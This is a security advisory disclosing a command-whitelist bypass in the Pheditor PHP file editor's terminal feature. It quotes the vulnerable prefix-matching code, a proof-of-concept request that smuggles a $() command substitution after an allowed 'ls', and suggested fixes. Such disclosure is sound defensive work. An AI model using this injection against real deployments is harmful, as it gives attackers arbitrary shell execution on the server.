# [H] Pheditor has an authenticated terminal command whitelist bypass

## Summary
Severity: High
Advisory: GHSA-9643-6xjp-vx57
CVE: CVE-2026-54540
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-16
Source: https://github.com/advisories/GHSA-9643-6xjp-vx57
Type: github-advisory

## Affected
- Packagist: `pheditor/pheditor` — affected >=0 <2.0.5

## Details
### Summary

Pheditor 2.0.4 has an authenticated terminal command whitelist bypass.

The terminal feature checks whether the submitted command starts with one of the configured `TERMINAL_COMMANDS` values, then passes the full command string to `shell_exec()`. Shell command substitution such as `$()` is not blocked, so an authenticated user with the `terminal` permission can bypass a restricted command allowlist and execute arbitrary shell commands as the web server user.

### Details

Tested repository:

https://github.com/pheditor/pheditor

Tested commit:

`62b43df7cb8956a9b0deb9bec278ca8676c890c5`

Affected version:

Pheditor 2.0.4

Relevant code in `pheditor.php`:

- The terminal handler receives `$_POST['command']` and stores it in `$command`.
- It blocks only `&`, `;`, and `||`.
- It checks whether `$command` starts with one of the configured values in `TERMINAL_COMMANDS`.
- It then passes the full command string to `shell_exec()`.

Relevant logic:

```php
$command = $_POST['command'];

if (strpos($command, '&') !== false || strpos($command, ';') !== false || strpos($command, '||') !== false) {
    echo json_error("Illegal character(s) in command (& ; ||)\n");
    exit;
}

foreach ($terminal_commands as $value) {
    $value = trim($value);

    if (strlen($command) >= strlen($value) && substr($command, 0, strlen($value)) == $value) {
        $command_found = true;
        break;
    }
}

$output = shell_exec((empty($dir) ? null : 'cd ' . escapeshellarg($dir) . ' && ') . $command . ' && echo \ ; pwd');
```

Because the whitelist check is prefix-based and the full command is executed by a shell, a command such as `ls$(...)` passes when `ls` is allowed, while the command substitution is still executed by the shell.

### PoC

This was reproduced locally with Docker and PHP 8.3.

For a strict test, the configured command allowlist was changed to only allow `ls`:

```php
define('TERMINAL_COMMANDS', 'ls');
```

Control request:

```text
command=whoami
```

Observed result:

```text
Command not allowed
Available commands:
ls
```

Bypass request:

```text
command=ls$(printf pheditor-terminal-bypass >/lab/app/site/proof.txt)
```

Observed result:

```text
proof.txt is created with the content:
pheditor-terminal-bypass
```

This shows that even when only `ls` is allowed, arbitrary shell commands can still be executed through command substitution.

### Impact

An authenticated user with the `terminal` permission can bypass the intended `TERMINAL_COMMANDS` restriction and execute arbitrary shell commands as the web server user.

This affects deployments where administrators rely on `TERMINAL_COMMANDS` to restrict terminal access to a small set of safe commands.

Suggested fixes:

- Avoid passing user-controlled command strings to `shell_exec()`.
- Parse the command into executable and arguments.
- Require an exact command name match instead of prefix matching.
- Execute without a shell, for example with an argument-array based process API.
- If shell execution remains necessary, reject shell metacharacters comprehensively, including command substitution syntax.
- Consider disabling the terminal feature by default.

Reporter credit requested:

shanjijian <shanjijian@gmail.com>

## References
- https://github.com/pheditor/pheditor/security/advisories/GHSA-9643-6xjp-vx57
- https://github.com/pheditor/pheditor
- https://github.com/pheditor/pheditor/releases/tag/2.0.5
